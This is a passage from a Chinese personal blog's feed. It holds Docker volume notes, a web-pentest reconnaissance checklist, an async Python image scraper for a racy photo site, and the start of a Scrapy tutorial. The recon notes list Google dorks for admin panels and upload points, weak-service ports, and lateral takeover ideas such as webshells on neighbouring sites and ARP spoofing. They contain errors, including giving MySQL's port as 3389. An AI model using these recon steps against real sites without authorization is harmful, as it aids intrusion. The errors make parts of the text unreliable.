class="line">1</span><br></pre></td><td class="code"><pre><span class="line">为了容器的持久化和同步操作</span><br></pre></td></tr></table></figure><p><strong>使用数据卷</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">挂载</span><br><span class="line">docker run -it -v 主机目录:容器目录</span><br></pre></td></tr></table></figure><p><strong>测试同步mysql</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">1.启动并映射端口,设置密码</span></span><br><span class="line">docker run -d -p 3310:3306 -v /Users/chenci/guazai/mysql:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=123456 --name some-mysql mysql:5.7</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">2.远程连接</span></span><br><span class="line">mysql -uroot -p123456 -h 10.30.3.100 -P 3310</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">3.在远程连接中创建数据库测试</span></span><br><span class="line">测试无误,本地和容器中都会多一个测试数据库</span><br></pre></td></tr></table></figure><p><strong>具名和匿名挂载</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">只写了容器内的路径,就是匿名挂载</span></span><br><span class="line">docker run -it -P --name nginx -V /path id</span><br><span class="line"><span class="meta">#</span><span class="language-bash">查看</span></span><br><span class="line">local     6c71f963cc89b24d16b4b47cb35df42445ff9d9395753b192ba72cbbbc22d583</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">写了名字就是具名挂载</span></span><br><span class="line">docker run -it -P --name nginx -V juming /path id</span><br><span class="line"><span class="meta">#</span><span class="language-bash">查看</span></span><br><span class="line">local     juming</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">查看所有的volume</span></span><br><span class="line">docker volume ls</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">查看卷</span></span><br><span class="line">docker volume inspect juming</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong><code>通过具名可以方便找到一个卷通所以一般使用具名挂载</code></strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-v 容器内路径 #匿名挂载</span><br><span class="line">-v 卷名:容器内路径 #匿名挂载</span><br></pre></td></tr></table></figure><p><strong><code>扩展</code></strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">在路径后面跟:ro或则rw</span></span><br><span class="line">ro表示这个路径只能通过宿主机来操作,容器内部无法操作</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;docker帮助命令&quot;&gt;&lt;a href=&quot;#docker帮助命令&quot; class=&quot;headerlink&quot; title=&quot;docker帮助命令&quot;&gt;&lt;/a&gt;docker帮助命令&lt;/h2&gt;&lt;figure class=&quot;highlight jboss-cli&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;docker &lt;span class=&quot;keyword&quot;&gt;version&lt;/span&gt; 显示版本信息&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;docker &lt;span class=&quot;keyword&quot;&gt;help&lt;/span&gt; 帮助&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;docker info 基本信息&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;docker镜像命令&quot;&gt;&lt;a href=&quot;#docker镜像命令&quot; class=&quot;headerlink&quot; title=&quot;docker镜像命令&quot;&gt;&lt;/a&gt;docker镜像命令&lt;/h2&gt;&lt;figure class=&quot;highlight dsconfig&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;docker&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;images&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# 可选项&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;-&lt;span class=&quot;string&quot;&gt;a&lt;/span&gt;, &lt;span class=&quot;built_in&quot;&gt;--all&lt;/span&gt;   &lt;span class=&quot;comment&quot;&gt;# 列出所有镜像&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;-&lt;span class=&quot;string&quot;&gt;q&lt;/span&gt;, &lt;span class=&quot;built_in&quot;&gt;--quite&lt;/span&gt; &lt;span class=&quot;comment&quot;&gt;# 只显示镜像的id&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h4 id=&quot;docker-search-搜索镜像&quot;&gt;&lt;a href=&quot;#docker-search-搜索镜像&quot; class=&quot;headerlink&quot; title=&quot;docker search 搜索镜像&quot;&gt;&lt;/a&gt;docker search 搜索镜像&lt;/h4&gt;</summary>
    
    
    
    <category term="工具使用" scheme="http://example.com/categories/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
    
    
    <category term="教程" scheme="http://example.com/tags/%E6%95%99%E7%A8%8B/"/>
    
    <category term="docker" scheme="http://example.com/tags/docker/"/>
    
  </entry>
  
  <entry>
    <title>信息收集</title>
    <link href="http://example.com/2022/04/17/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    <id>http://example.com/2022/04/17/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</id>
    <published>2022-04-17T11:52:17.000Z</published>
    <updated>2022-04-20T07:09:35.497Z</updated>
    
    <content type="html"><![CDATA[<h1 id="信息收集流程框架"><a href="#信息收集流程框架" class="headerlink" title="信息收集流程框架"></a>信息收集流程框架</h1><pre><code>web安全的本质是信息收集,信息收集的广度决定了渗透测试的深度</code></pre><p><img src="/2022/04/17/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/img.png" alt="1"></p><h1 id="google-hacking"><a href="#google-hacking" class="headerlink" title="google hacking"></a>google hacking</h1><p>利用谷歌强大的搜索引擎,经常会有意想不到的的收获</p><h2 id="基本的搜索"><a href="#基本的搜索" class="headerlink" title="基本的搜索"></a>基本的搜索</h2><ul><li>逻辑与 and</li><li>逻辑或 or</li><li>逻辑非 </li><li>通配符 *</li></ul><h2 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h2><p>intext寻找网页正文中的关键字,如: intext后台登录</p><p><img src="/2022/04/17/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/img_1.png" alt="intext后台登录"></p><p>intitle寻找网页标题中的关键字,如: intitle</p><p><img src="/2022/04/17/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/img_2.png" alt="intitle"></p><p>allintitle用法和intitle差不多,差别在于可指定多个关键字<br>inurl返回url中含有关键字的网页,如: inurl:login</p><p><img src="/2022/04/17/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/img_3.png" alt="inurl:login"></p><p>查找管理员登录界面</p><p><img src="/2022/04/17/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/img_4.png" alt="管理员登录界面"></p><p>查找phpmyadmin</p><p><img src="/2022/04/17/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/img_5.png" alt="phpmyadmin"></p><p>allinurl和inurl的用法差不多,差别在于可指定多个关键字<br>site指定访问的网站,如,site:baidu.com inurl:login</p><p><img src="/2022/04/17/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/img_6.png" alt="allinurl"></p><h2 id="查找网站后台"><a href="#查找网站后台" class="headerlink" title="查找网站后台"></a>查找网站后台</h2><ul><li>site:xx.com intext:管理</li><li>site:xx.com inurl:login</li><li>site:xx.com intitle:后台</li></ul><h2 id="查看服务器使用的程序"><a href="#查看服务器使用的程序" class="headerlink" title="查看服务器使用的程序"></a>查看服务器使用的程序</h2><ul><li>site:xx.com filetype:asp</li><li>site:xx.com filetype:php</li><li>site:xx.com filetype:jsp</li><li>site:xx.com filetype:aspx</li></ul><h2 id="查看上传漏洞"><a href="#查看上传漏洞" class="headerlink" title="查看上传漏洞"></a>查看上传漏洞</h2><ul><li>site:xx.com inurl:file</li><li>site:xx.com inurl:load</li></ul><h1 id="dns域名信息"><a href="#dns域名信息" class="headerlink" title="dns域名信息"></a>dns域名信息</h1><p>首先是对应域名的ip,域名注册人,邮箱,dns,子域名之类的信息</p><p><img src="/2022/04/17/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/img_7.png" alt="allinurl"></p><h2 id="whois查询"><a href="#whois查询" class="headerlink" title="whois查询"></a>whois查询</h2><ul><li>然后判断是否有cdn    <a href="http://cdn.chinaz.com/">http://cdn.chinaz.com</a></li><li>也可以使用不同地区的电脑ping,看ip是否是同一个</li><li>如果查询出的ip有多个就说明使用了cdn</li></ul><h2 id="CDN查询"><a href="#CDN查询" class="headerlink" title="CDN查询"></a>CDN查询</h2><ul><li>绕过cdn查询真实ip <a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a> 微步</li></ul><h1 id="整站分析"><a href="#整站分析" class="headerlink" title="整站分析"></a>整站分析</h1><p>服务器类型</p><ul><li>服务器平台,版本等<br>网站容器</li><li>搭建网站的服务组件,如:iis,apache,nginx等等<br>脚本类型</li><li>常见的有asp,php,jsp,aspx<br>数据库类型</li><li>常见的有access,sqlserver,mysql,oracle<br>cms类型</li><li>网站模板<br>waf</li><li>安全防护软件</li></ul><h2 id="服务器类型-windows-x2F-linux"><a href="#服务器类型-windows-x2F-linux" class="headerlink" title="服务器类型(windows&#x2F;linux)"></a>服务器类型(windows&#x2F;linux)</h2><ul><li>nmap 扫描</li><li>google抓包分析</li></ul><h2 id="网站容器-iis-apache-nginx"><a href="#网站容器-iis-apache-nginx" class="headerlink" title="网站容器(iis,apache,nginx)"></a>网站容器(iis,apache,nginx)</h2><p>知道网站容器很重要,如iis6.0的解析漏洞,ngixn&lt;0.83的解析漏洞.,iis7.0的畸形解析漏洞等等</p><ul><li>nmap 扫描</li><li>google抓包分析</li></ul><h2 id="脚本类型-php-jsp-asp-aspx等"><a href="#脚本类型-php-jsp-asp-aspx等" class="headerlink" title="脚本类型(php,jsp,asp,aspx等)"></a>脚本类型(php,jsp,asp,aspx等)</h2><ul><li>根据网站的url</li><li>直接打开一个展示页面查看</li><li>根据firefox的插件查看</li></ul><h2 id="数据库类型"><a href="#数据库类型" class="headerlink" title="数据库类型"></a>数据库类型</h2><ul><li>mysql端口为3389,数据库后缀名.sql</li><li>sqlserver端口为1433,数据库后缀名.mdf</li><li>access后缀名为.mdb</li><li>oraacle,端口为1521</li></ul><p>一般的常见搭配为</p><ul><li>ASP和ASPX:access,sqlserver</li><li>PHP:mysql</li><li>JSP:oracle,mysql</li></ul><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p>扫描目标开放了哪些端口,如常见的135,137,445经常爆发出漏洞</p><ul><li>21,22,23,3389    ftp,ssh,telnet,windows远程桌面</li><li>873 rsync 未授权访问漏洞</li><li>3306 mysql 弱口令</li><li>6379 redis未授权访问漏洞</li></ul><h2 id="网站敏感目录和文件"><a href="#网站敏感目录和文件" class="headerlink" title="网站敏感目录和文件"></a>网站敏感目录和文件</h2><ul><li>后台目录:万能密码,弱口令,爆破</li><li>安装包:获取数据库信息,甚至是网站源码</li><li>上传目录:上传木马,一句话等</li><li>mysql管理接口:爆破,弱口令,万能密码,甚至能直接拿shell</li><li>phpinfo:暴露各种配置信息</li><li>编辑器:各种畸形漏洞</li><li>robots.txt</li></ul><h2 id="旁站和C段"><a href="#旁站和C段" class="headerlink" title="旁站和C段"></a>旁站和C段</h2><ul><li><p>旁站指的是同一服务器上得不同网站,如果你拿不下这个网站,不如试试旁站.拿下旁站webshell,再提权也就拿下了这个网站了</p></li><li><p>C段指的是同一网段的其他服务器,192.168.0.1,0就是C段.如果拿下了C段中一台服务器,就可使用嗅探工具,arp欺骗等劫持流量,找到关键信息,拿下服务器</p></li><li><p>旁站查询:<a href="http://s.tool.chinaz.com/same">http://s.tool.chinaz.com/same</a></p></li><li><p>C段查询:<a href="http://www.webscan.cc/">http://www.webscan.cc/</a></p></li></ul>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;信息收集流程框架&quot;&gt;&lt;a href=&quot;#信息收集流程框架&quot; class=&quot;headerlink&quot; title=&quot;信息收集流程框架&quot;&gt;&lt;/a&gt;信息收集流程框架&lt;/h1&gt;&lt;pre&gt;&lt;code&gt;web安全的本质是信息收集,信息收集的广度决定了渗透测试的深度
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;/2022/04/17/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/img.png&quot; alt=&quot;1&quot;&gt;&lt;/p&gt;
&lt;h1 id=&quot;google-hacking&quot;&gt;&lt;a href=&quot;#google-hacking&quot; class=&quot;headerlink&quot; title=&quot;google hacking&quot;&gt;&lt;/a&gt;google hacking&lt;/h1&gt;&lt;p&gt;利用谷歌强大的搜索引擎,经常会有意想不到的的收获&lt;/p&gt;</summary>
    
    
    
    <category term="笔记" scheme="http://example.com/categories/%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="web安全" scheme="http://example.com/tags/web%E5%AE%89%E5%85%A8/"/>
    
    <category term="信息收集" scheme="http://example.com/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
  </entry>
  
  <entry>
    <title>异步协程爬取福利姬</title>
    <link href="http://example.com/2022/04/14/%E5%BC%82%E6%AD%A5%E7%88%AC%E5%8F%96%E6%9F%90%E6%B6%A9%E6%83%85%E7%BD%91%E7%AB%99%E5%9B%BE%E7%89%87/"/>
    <id>http://example.com/2022/04/14/%E5%BC%82%E6%AD%A5%E7%88%AC%E5%8F%96%E6%9F%90%E6%B6%A9%E6%83%85%E7%BD%91%E7%AB%99%E5%9B%BE%E7%89%87/</id>
    <published>2022-04-14T08:16:16.000Z</published>
    <updated>2022-04-20T12:27:06.560Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">-------------------------------------------------</span></span><br><span class="line"><span class="string">   File Name：     协程4-实战爬取tuao8.com</span></span><br><span class="line"><span class="string">   Author :       chenci</span></span><br><span class="line"><span class="string">   date：          2022/3/25</span></span><br><span class="line"><span class="string">-------------------------------------------------</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> aiofiles</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> aiohttp</span><br><span class="line"><span class="keyword">from</span> fake_useragent <span class="keyword">import</span> UserAgent</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_dir_not_exist</span>(<span class="params">path</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(path):</span><br><span class="line">        os.makedirs(path)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 抓取每个条目的图集</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_photos_url</span>():</span><br><span class="line">    resp = requests.get(url=<span class="string">&#x27;https://www.tuao8.xyz/category-2_1.html&#x27;</span>, headers=header)</span><br><span class="line">    text = etree.HTML(resp.text)</span><br><span class="line">    href_url_list = text.xpath(<span class="string">&#x27;//*[@id=&quot;container&quot;]/main/article/div/a/@href&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> href_url_list</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 去请求每个图集.返回源码</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">get_photos</span>(<span class="params">photo_list</span>):</span><br><span class="line">    <span class="comment"># 限制并发熟路默认100,0为无限制</span></span><br><span class="line">    conn = aiohttp.TCPConnector(limit=<span class="number">10</span>)</span><br><span class="line">    <span class="comment"># 发送请求</span></span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">with</span> aiohttp.ClientSession(connector=conn) <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">async</span> <span class="keyword">with</span> <span class="keyword">await</span> session.get(url=photo_list, headers=header) <span class="keyword">as</span> resp:</span><br><span class="line">            page_text = <span class="keyword">await</span> resp.text()</span><br><span class="line">            <span class="keyword">await</span> get_photos_title_page(page_text, photo_list)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 从每个源码里筛选出标题和最大页码,url</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">get_photos_title_page</span>(<span class="params">text, url</span>):</span><br><span class="line">    tasks = []</span><br><span class="line">    html = etree.HTML(text)</span><br><span class="line">    title = html.xpath(<span class="string">&#x27;//*[@id=&quot;container&quot;]/main/article/h1/text()&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">    max_page = <span class="built_in">int</span>(html.xpath(<span class="string">&#x27;//*[@id=&quot;dm-fy&quot;]/li[last()-1]/a/text()&#x27;</span>)[<span class="number">0</span>])</span><br><span class="line">    create_dir_not_exist(<span class="string">f&#x27;./imgs/tuzo_xc/<span class="subst">&#123;title&#125;</span>&#x27;</span>)</span><br><span class="line">    task = asyncio.create_task(get_download_url(url=url, title=title, max_page=max_page))</span><br><span class="line">    tasks.append(task)</span><br><span class="line">    <span class="keyword">await</span> asyncio.wait(tasks)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取每一页的url并从源码中筛选出每张图片的下载链接</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">get_download_url</span>(<span class="params">url, title, max_page</span>):</span><br><span class="line">    tasks = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, max_page):</span><br><span class="line">        urls = <span class="string">f&#x27;<span class="subst">&#123;url&#125;</span>?page=<span class="subst">&#123;i&#125;</span>&#x27;</span></span><br><span class="line">        conn = aiohttp.TCPConnector(limit=<span class="number">10</span>)</span><br><span class="line">        <span class="keyword">async</span> <span class="keyword">with</span> aiohttp.ClientSession(connector=conn) <span class="keyword">as</span> session:</span><br><span class="line">            <span class="keyword">async</span> <span class="keyword">with</span> <span class="keyword">await</span> session.get(url=urls, headers=header) <span class="keyword">as</span> resp:</span><br><span class="line">                page_text = <span class="keyword">await</span> resp.text()</span><br><span class="line">                html = etree.HTML(page_text)</span><br><span class="line">                image_url = html.xpath(<span class="string">&#x27;//*[@class=&quot;entry&quot;]//img/@src&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">                task = asyncio.create_task(download_image(image_url, title, i))</span><br><span class="line">                tasks.append(task)</span><br><span class="line">    <span class="keyword">await</span> asyncio.wait(tasks)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 下载</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">download_image</span>(<span class="params">image_url, title, i</span>):</span><br><span class="line">    conn = aiohttp.TCPConnector(limit=<span class="number">30</span>)</span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">with</span> aiohttp.ClientSession(connector=conn) <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">async</span> <span class="keyword">with</span> <span class="keyword">await</span> session.get(url=image_url, headers=header) <span class="keyword">as</span> resp:</span><br><span class="line">                <span class="built_in">print</span>(image_url)</span><br><span class="line">                <span class="keyword">async</span> <span class="keyword">with</span> aiofiles.<span class="built_in">open</span>(<span class="string">f&#x27;./imgs/<span class="subst">&#123;title&#125;</span>/<span class="subst">&#123;i&#125;</span>.jpg&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&#x27;正在下载<span class="subst">&#123;title&#125;</span>  第<span class="subst">&#123;i&#125;</span>张&#x27;</span>)</span><br><span class="line">                    <span class="keyword">await</span> f.write(<span class="keyword">await</span> resp.read())</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;下载完成&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    href_url_list = get_photos_url()</span><br><span class="line">    tasks = []</span><br><span class="line">    <span class="keyword">for</span> url <span class="keyword">in</span> href_url_list:</span><br><span class="line">        task = asyncio.create_task(get_photos(photo_list=url))</span><br><span class="line">        tasks.append(task)</span><br><span class="line">    <span class="keyword">await</span> asyncio.wait(tasks)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    start = time.time()</span><br><span class="line">    ua = UserAgent()</span><br><span class="line">    header = &#123;</span><br><span class="line">        <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;https://www.tuao8.xyz/category-2_2.html&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;user-agent&#x27;</span>: ua.random</span><br><span class="line">    &#125;</span><br><span class="line">    asyncio.run(main())</span><br><span class="line">    end = time.time()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;全部下载完成!耗时:&#x27;</span>, <span class="built_in">int</span>(end - start), <span class="string">&#x27;秒&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2022/04/14/%E5%BC%82%E6%AD%A5%E7%88%AC%E5%8F%96%E6%9F%90%E6%B6%A9%E6%83%85%E7%BD%91%E7%AB%99%E5%9B%BE%E7%89%87/img.png" alt="1"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span clas</summary>
      
    
    
    
    <category term="爬虫" scheme="http://example.com/categories/%E7%88%AC%E8%99%AB/"/>
    
    
    <category term="requests" scheme="http://example.com/tags/requests/"/>
    
    <category term="异步" scheme="http://example.com/tags/%E5%BC%82%E6%AD%A5/"/>
    
  </entry>
  
  <entry>
    <title>scrapy框架学习</title>
    <link href="http://example.com/2022/04/08/scrapy%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0/"/>
    <id>http://example.com/2022/04/08/scrapy%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0/</id>
    <published>2022-04-08T10:57:11.000Z</published>
    <updated>2022-04-17T09:00:21.109Z</updated>
    
    <content type="html"><![CDATA[<h2 id="创建项目"><a href="#创建项目" class="headerlink" title="创建项目"></a>创建项目</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scrapy startproject tutorial</span><br></pre></td></tr></table></figure><h2 id="创建任务"><a href="#创建任务" class="headerlink" title="创建任务"></a>创建任务</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scrapy genspider first www.baidu.com</span><br></pre></td></tr></table></figure><p>会生成一个first文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">FirstSpider</span>(scrapy.Spider):</span><br><span class="line">    <span class="comment"># 唯一标识符</span></span><br><span class="line">    name = <span class="string">&#x27;first&#x27;</span></span><br><span class="line">    <span class="comment"># 允许的域名</span></span><br><span class="line">    allowed_domains = [<span class="string">&#x27;www.baidu.com&#x27;</span>]</span><br><span class="line">    <span class="comment"># 起始的url,默认发送get请求</span></span><br><span class="line">    start_urls = [<span class="string">&#x27;https://www.baidu.com/&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 数据解析</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">parse</span>(<span class="params">self, response</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><h2 id="修改配置文件"><a href="#修改配置文件" class="headerlink" title="修改配置文件"></a>修改配置文件</h2><p>只输出ERROR级别的日志</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 只输出ERROR级别的日志</span></span><br><span class="line">LOG_LEVEL = <span 